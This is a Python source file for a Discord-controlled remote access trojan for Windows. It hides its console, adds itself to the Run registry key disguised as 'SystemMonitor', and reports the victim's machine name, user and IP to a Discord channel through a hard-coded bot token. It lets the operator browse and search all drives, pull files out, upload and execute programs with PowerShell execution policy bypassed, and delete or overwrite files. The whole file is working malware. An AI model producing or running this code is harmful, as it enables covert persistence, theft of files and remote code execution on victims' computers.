import discord
import os
import platform
import psutil
import sys
import shutil
import winreg
import glob
from discord.ext import commands
from discord import File
import asyncio
from discord.ui import Button, View
import math
import subprocess
import time

# Hide console window (Windows specific)
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Add to startup registry - FIXED VERSION
def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Get the path to the current executable
        if getattr(sys, 'frozen', False):
            # Running as compiled exe
            exe_path = sys.executable
        else:
            # Running as script
            exe_path = os.path.abspath(sys.argv[0])
            # If it's a .py file, we need to compile it first for startup to work properly
            if exe_path.endswith('.py'):
                exe_path = os.path.join(os.path.dirname(exe_path), 'dist', 'SystemMonitor.exe')
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as registry_key:
            try:
                # Check if already exists
                current_value, _ = winreg.QueryValueEx(registry_key, "SystemMonitor")
                if current_value != exe_path:
                    # Update if path changed
                    winreg.SetValueEx(registry_key, "SystemMonitor", 0, winreg.REG_SZ, exe_path)
                else:
                    pass
            except FileNotFoundError:
                # Doesn't exist, add it
                winreg.SetValueEx(registry_key, "SystemMonitor", 0, winreg.REG_SZ, exe_path)
        return True
    except Exception:
        return False

# Call this function to add to startup - FIXED
add_to_startup()

# Bot setup with necessary intents
intents = discord.Intents.default()
intents.message_content = True

# Disable the default help command to avoid conflicts
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Store pagination data
pagination_data = {}

# Pagination View Class
class PaginationView(View):
    def __init__(self, user_id, data_key, total_pages, current_page=0):
        super().__init__(timeout=60)
        self.user_id = user_id
        self.data_key = data_key
        self.total_pages = total_pages
        self.current_page = current_page
        
    async def interaction_check(self, interaction) -> bool:
        return interaction.user.id == self.user_id
    
    @discord.ui.button(emoji="⬅️", style=discord.ButtonStyle.gray)
    async def previous_button(self, interaction: discord.Interaction, button: Button):
        if self.current_page > 0:
            self.current_page -= 1
            await self.update_message(interaction)
    
    @discord.ui.button(emoji="➡️", style=discord.ButtonStyle.gray)
    async def next_button(self, interaction: discord.Interaction, button: Button):
        if self.current_page < self.total_pages - 1:
            self.current_page += 1
            await self.update_message(interaction)
    
    @discord.ui.button(emoji="⏹️", style=discord.ButtonStyle.red)
    async def stop_button(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()
        await interaction.delete_original_response()
        if self.data_key in pagination_data:
            del pagination_data[self.data_key]
    
    async def update_message(self, interaction):
        if self.data_key not in pagination_data:
            await interaction.response.send_message("This pagination session has expired.", ephemeral=True)
            return
        
        items, title = pagination_data[self.data_key]
        start_idx = self.current_page * 10
        end_idx = start_idx + 10
        page_items = items[start_idx:end_idx]
        
        embed = discord.Embed(
            title=f"{title} (Page {self.current_page + 1}/{self.total_pages})",
            description="\n".join(page_items) if page_items else "No items found.",
            color=0x00ff00
        )
        
        await interaction.response.edit_message(embed=embed, view=self)

# Function to create paginated message
async def send_paginated(ctx, items, title):
    if not items:
        await ctx.send(f"❌ No items found for: {title}")
        return
    
    total_pages = math.ceil(len(items) / 10)
    data_key = f"{ctx.author.id}_{ctx.message.id}"
    pagination_data[data_key] = (items, title)
    
    # Show first page
    start_idx = 0
    end_idx = 10
    page_items = items[start_idx:end_idx]
    
    embed = discord.Embed(
        title=f"{title} (Page 1/{total_pages})",
        description="\n".join(page_items) if page_items else "No items found.",
        color=0x00ff00
    )
    
    view = PaginationView(ctx.author.id, data_key, total_pages)
    await ctx.send(embed=embed, view=view)

# Bot Event Handlers
@bot.event
async def on_ready():
    # No console output, completely silent
    channel_id = 1433453388271456308  # REPLACE WITH YOUR CHANNEL ID
    channel = bot.get_channel(channel_id)

    if channel:
        computer_name = platform.node()
        user_name = os.getenv('USERNAME') or os.getenv('USER')
        os_info = f"{platform.system()} {platform.release()}"
        
        ip_address = "Unable to determine"
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == 2 and not addr.address.startswith('127.'):
                    ip_address = addr.address
                    break
            if ip_address != "Unable to determine":
                break

        startup_message = (
            f"🖥️ **Machine Online**\n"
            f"**Computer:** {computer_name}\n"
            f"**User:** {user_name}\n"
            f"**OS:** {os_info}\n"
            f"**IP:** {ip_address}\n"
            f"**Time:** {discord.utils.utcnow()}\n"
            f"**Initial Directory:** `{os.getcwd()}`\n"
            f"**Startup:** ✅ Registered\n"
            f"**Features:** Search, Pagination, Full System Search"
        )
        await channel.send(startup_message)

# File System Commands
@bot.command(name='ls')
async def list_files(ctx, path: str = None):
    target_path = path if path else os.getcwd()
    
    try:
        if not os.path.exists(target_path):
            await ctx.send("❌ Error: Path does not exist.")
            return
        
        items = os.listdir(target_path)
        if not items:
            await ctx.send("📁 Directory is empty.")
            return
        
        formatted_items = []
        for item in items:
            item_path = os.path.join(target_path, item)
            if os.path.isdir(item_path):
                formatted_items.append(f"📁 `{item}`")
            else:
                size = os.path.getsize(item_path)
                if size > 1024*1024:
                    size_str = f"{size/(1024*1024):.1f} MB"
                elif size > 1024:
                    size_str = f"{size/1024:.1f} KB"
                else:
                    size_str = f"{size} B"
                formatted_items.append(f"📄 `{item}` ({size_str})")
        
        await send_paginated(ctx, formatted_items, f"Directory: {target_path}")
        
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")

@bot.command(name='cd')
async def change_directory(ctx, path: str):
    try:
        os.chdir(path)
        await ctx.send(f"📂 Current directory: `{os.getcwd()}`")
    except FileNotFoundError:
        await ctx.send("❌ Error: Directory not found.")
    except PermissionError:
        await ctx.send("❌ Error: Permission denied.")
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")

@bot.command(name='pwd')
async def print_working_directory(ctx):
    await ctx.send(f"📂 Current directory: `{os.getcwd()}`")

# FIXED DOWNLOAD COMMAND - NOW SUPPORTS SPACES IN FILENAMES
@bot.command(name='download')
async def download_file(ctx, *, file_name: str):
    """Download a file (supports spaces in filenames) - use quotes if needed"""
    try:
        # Remove any surrounding quotes that might be added
        file_name = file_name.strip('"').strip("'")
        
        if not os.path.exists(file_name):
            await ctx.send(f"❌ Error: File not found: `{file_name}`")
            return
        
        if os.path.isdir(file_name):
            await ctx.send("❌ Error: Cannot download directory.")
            return
        
        file_size = os.path.getsize(file_name)
        if file_size > 8 * 1024 * 1024:
            await ctx.send("❌ Error: File too large (max 8MB).")
            return
        
        await ctx.send(file=File(file_name))
        await ctx.send(f"✅ File sent: `{file_name}`")
        
    except Exception as e:
        await ctx.send(f"❌ Error downloading `{file_name}`: `{str(e)}`")

# FIXED UPLOADRUN COMMAND - NO DUPLICATE EXECUTION
@bot.command(name='uploadrun')
async def upload_and_run(ctx):
    """Upload a file and immediately execute it in the current directory"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach a file to use !uploadrun")
        return
    
    # Only process the first attachment to avoid duplicates
    attachment = ctx.message.attachments[0]
    
    try:
        # Save the file
        file_name = attachment.filename
        await attachment.save(file_name)
        
        await ctx.send(f"✅ Uploaded: `{file_name}`")
        
        # Execute the file based on its type - FIXED: Use shell=False to prevent duplicate processes
        if file_name.lower().endswith(('.exe', '.bat', '.cmd', '.msi')):
            # For executables, run directly without shell to prevent (2) processes
            subprocess.Popen([file_name], shell=False)
            await ctx.send(f"🚀 Executing: `{file_name}`")
            
        elif file_name.lower().endswith(('.py')):
            # For Python scripts, run with python
            subprocess.Popen([sys.executable, file_name], shell=False)
            await ctx.send(f"🚀 Executing Python script: `{file_name}`")
            
        elif file_name.lower().endswith(('.ps1')):
            # For PowerShell scripts
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_name], shell=False)
            await ctx.send(f"🚀 Executing PowerShell script: `{file_name}`")
            
        else:
            await ctx.send(f"📁 File saved but not executed (unsupported type): `{file_name}`")
            
    except Exception as e:
        await ctx.send(f"❌ Error with `{attachment.filename}`: `{str(e)}`")

# FIXED RM COMMAND - NOW SUPPORTS SPACES IN FILENAMES
@bot.command(name='rm')
async def remove_file(ctx, *, file_name: str):
    """Delete a file (supports spaces in filenames) - use quotes if needed"""
    try:
        file_name = file_name.strip('"').strip("'")
        
        if not os.path.exists(file_name):
            await ctx.send(f"❌ Error: File not found: `{file_name}`")
            return
        
        if os.path.isdir(file_name):
            await ctx.send("❌ Error: Use !rmdir for directories.")
            return
        
        os.remove(file_name)
        await ctx.send(f"✅ Deleted: `{file_name}`")
        
    except PermissionError:
        await ctx.send("❌ Error: Permission denied.")
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")

# FIXED RMPERM COMMAND - NOW SUPPORTS SPACES IN FILENAMES
@bot.command(name='rmperm')
async def remove_permanent(ctx, *, file_name: str):
    """Permanently delete file (bypass recycle bin) - use quotes if needed"""
    try:
        file_name = file_name.strip('"').strip("'")
        
        if not os.path.exists(file_name):
            await ctx.send(f"❌ Error: File not found: `{file_name}`")
            return
        
        if os.path.isdir(file_name):
            await ctx.send("❌ Error: Use !rmdir for directories.")
            return
        
        # Overwrite file with zeros before deletion for permanent removal
        file_size = os.path.getsize(file_name)
        try:
            with open(file_name, 'wb') as f:
                f.write(b'\x00' * file_size)
        except:
            pass  # If we can't overwrite, just delete normally
        
        os.remove(file_name)
        await ctx.send(f"🔥 PERMANENTLY DELETED: `{file_name}`")
        
    except PermissionError:
        await ctx.send("❌ Error: Permission denied.")
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")

@bot.command(name='search')
async def search_files(ctx, search_term: str, start_path: str = None):
    """Search for files and directories containing the search term"""
    try:
        if start_path is None:
            start_path = os.getcwd()
        
        if not os.path.exists(start_path):
            await ctx.send("❌ Error: Start path does not exist.")
            return
        
        matches = []
        search_term_lower = search_term.lower()
        
        # Search in current directory and subdirectories
        for root, dirs, files in os.walk(start_path):
            # Search directories
            for dir_name in dirs:
                if search_term_lower in dir_name.lower():
                    full_path = os.path.join(root, dir_name)
                    matches.append(f"📁 `{full_path}`")
            
            # Search files
            for file_name in files:
                if search_term_lower in file_name.lower():
                    full_path = os.path.join(root, file_name)
                    try:
                        size = os.path.getsize(full_path)
                        if size > 1024*1024:
                            size_str = f"{size/(1024*1024):.1f} MB"
                        elif size > 1024:
                            size_str = f"{size/1024:.1f} KB"
                        else:
                            size_str = f"{size} B"
                        matches.append(f"📄 `{full_path}` ({size_str})")
                    except:
                        matches.append(f"📄 `{full_path}`")
            
            # Limit results to avoid timeout
            if len(matches) >= 200:
                matches.append("... (results limited to 200 items)")
                break
        
        await send_paginated(ctx, matches, f"Search: '{search_term}' in {start_path}")
        
    except Exception as e:
        await ctx.send(f"❌ Search error: `{str(e)}`")

@bot.command(name='fullsearch')
async def full_system_search(ctx, search_term: str):
    """Search entire system (excluding system directories)"""
    try:
        await ctx.send(f"🔍 Starting full system search for: `{search_term}`... This may take a while.")
        
        matches = []
        search_term_lower = search_term.lower()
        
        # System directories to exclude
        system_dirs = [
            "System32", "SysWOW64", "Windows", "Program Files", "Program Files (x86)",
            "ProgramData", "Recovery", "System Volume Information", "$Recycle.Bin",
            "Windows.old", "Boot", "Config.Msi", "MSOCache", "PerfLogs",
            "Recovery", "System.sav", "Windows10Upgrade"
        ]
        
        # Get all drives
        drives = []
        for partition in psutil.disk_partitions():
            if 'cdrom' not in partition.opts and partition.fstype != '':
                drives.append(partition.mountpoint)
        
        for drive in drives:
            try:
                for root, dirs, files in os.walk(drive):
                    # Skip system directories
                    skip_this = False
                    for system_dir in system_dirs:
                        if system_dir in root:
                            skip_this = True
                            break
                    
                    if skip_this:
                        continue
                    
                    # Search directories
                    for dir_name in dirs:
                        if search_term_lower in dir_name.lower():
                            full_path = os.path.join(root, dir_name)
                            matches.append(f"📁 `{full_path}`")
                    
                    # Search files
                    for file_name in files:
                        if search_term_lower in file_name.lower():
                            full_path = os.path.join(root, file_name)
                            try:
                                size = os.path.getsize(full_path)
                                if size > 1024*1024:
                                    size_str = f"{size/(1024*1024):.1f} MB"
                                elif size > 1024:
                                    size_str = f"{size/1024:.1f} KB"
                                else:
                                    size_str = f"{size} B"
                                matches.append(f"📄 `{full_path}` ({size_str})")
                            except:
                                matches.append(f"📄 `{full_path}`")
                    
                    # Limit results per drive to avoid timeout
                    if len(matches) >= 300:
                        matches.append("... (results limited to 300 items)")
                        break
                
            except Exception as e:
                continue  # Skip drives with access issues
        
        if not matches:
            await ctx.send(f"❌ No files or directories found in full system search for: `{search_term}`")
            return
        
        await send_paginated(ctx, matches, f"Full System Search: '{search_term}'")
        
    except Exception as e:
        await ctx.send(f"❌ Full search error: `{str(e)}`")

# FIXED RMDIR COMMAND - NOW SUPPORTS SPACES
@bot.command(name='rmdir')
async def remove_directory(ctx, *, dir_name: str):
    try:
        dir_name = dir_name.strip('"').strip("'")
        
        if not os.path.exists(dir_name):
            await ctx.send(f"❌ Error: Directory not found: `{dir_name}`")
            return
        
        if not os.path.isdir(dir_name):
            await ctx.send("❌ Error: Not a directory.")
            return
        
        if os.listdir(dir_name):
            await ctx.send("❌ Error: Directory not empty.")
            return
        
        os.rmdir(dir_name)
        await ctx.send(f"✅ Deleted directory: `{dir_name}`")
        
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")

# FIXED RMTREE COMMAND - NOW SUPPORTS SPACES
@bot.command(name='rmtree')
async def remove_tree(ctx, *, dir_name: str):
    try:
        dir_name = dir_name.strip('"').strip("'")
        
        if not os.path.exists(dir_name):
            await ctx.send(f"❌ Error: Directory not found: `{dir_name}`")
            return
        
        if not os.path.isdir(dir_name):
            await ctx.send("❌ Error: Not a directory.")
            return
        
        shutil.rmtree(dir_name)
        await ctx.send(f"✅ Deleted directory and contents: `{dir_name}`")
        
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")

@bot.command(name='sysinfo')
async def system_info(ctx):
    computer_name = platform.node()
    user_name = os.getenv('USERNAME') or os.getenv('USER')
    os_info = f"{platform.system()} {platform.release()}"
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    system_info_msg = (
        f"**🖥️ System Information**\n"
        f"**Computer:** {computer_name}\n"
        f"**User:** {user_name}\n"
        f"**OS:** {os_info}\n"
        f"**CPU Usage:** {cpu_usage}%\n"
        f"**Memory:** {memory.percent}% used\n"
        f"**Disk:** {disk.percent}% used\n"
        f"**Directory:** `{os.getcwd()}`"
    )
    await ctx.send(system_info_msg)

@bot.command(name='driveinfo')
async def drive_info(ctx):
    drives = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            drives.append(f"**{partition.mountpoint}** - {usage.percent}% used ({usage.free//(1024**3)}GB free)")
        except:
            continue
    
    if drives:
        await send_paginated(ctx, drives, "Drive Information")
    else:
        await ctx.send("❌ Could not retrieve drive information.")

@bot.command(name='cmds')
async def custom_help(ctx):
    help_text = [
        "**🤖 Discord File System Bot - Commands**",
        "",
        "**📁 File Operations**",
        "`!ls [path]` - List files with pagination",
        "`!cd <path>` - Change directory", 
        "`!pwd` - Show current directory",
        "`!download \"file name.txt\"` - Download file (use quotes for spaces)",
        "`!rm \"file name.txt\"` - Delete file (use quotes for spaces)",
        "`!rmperm \"file name.txt\"` - PERMANENTLY delete file",
        "`!rmdir \"folder name\"` - Delete empty directory",
        "`!rmtree \"folder name\"` - Delete directory and contents",
        "",
        "**🔍 Search**", 
        "`!search <term> [path]` - Search in directory",
        "`!fullsearch <term>` - Search entire system",
        "",
        "**💻 System Info**",
        "`!sysinfo` - System information", 
        "`!driveinfo` - Drive information",
        "",
        "**🔼 File Upload & Execute**",
        "`!uploadrun` - Upload and execute a file (attach file)",
        "Attach file with 'upload' in message for normal upload",
        "",
        "**Examples:**",
        "`!ls C:\\Users`",
        "`!download \"my file with spaces.txt\"`",
        "`!fullsearch document`",
        "`!rmperm \"secret file.txt\"`"
    ]
    
    await send_paginated(ctx, help_text, "Bot Commands")

# File upload handler
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Handle file uploads - skip if it's an uploadrun command to avoid duplicate processing
    if message.attachments and "upload" in message.content.lower() and not message.content.startswith('!uploadrun'):
        for attachment in message.attachments:
            try:
                file_name = attachment.filename
                await attachment.save(file_name)
                await message.channel.send(f"✅ Uploaded: `{file_name}`")
            except Exception as e:
                await message.channel.send(f"❌ Upload failed: `{str(e)}`")
    
    # Process commands
    await bot.process_commands(message)

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("❌ Unknown command. Use `!cmds` for available commands.")
    else:
        await ctx.send(f"❌ Command error: `{str(error)}`")

# Clean up pagination data periodically
@bot.event
async def on_disconnect():
    pagination_data.clear()

# Silent connection function with retry ONLY for connection errors
async def silent_connect():
    while True:
        try:
            await bot.start('MTQzMzQ1Mzc2ODg5NjQxMzgyNg.GdTOSY.8EWo3ut-o5i5JT--FbArTKMLtayTV_faXYti5Q')
        except (discord.ConnectionClosed, discord.GatewayNotFound, OSError, TimeoutError) as e:
            # Only retry on actual connection issues - wait 30 seconds
            await asyncio.sleep(30)
        except Exception:
            # For other errors (invalid token, etc.), don't retry - just exit silently
            break

# Main Execution
if __name__ == "__main__":
    # Completely silent execution - no error logs, no popups
    try:
        asyncio.run(silent_connect())
    except Exception:
        # Ultimate silence - catch and ignore everything
        pass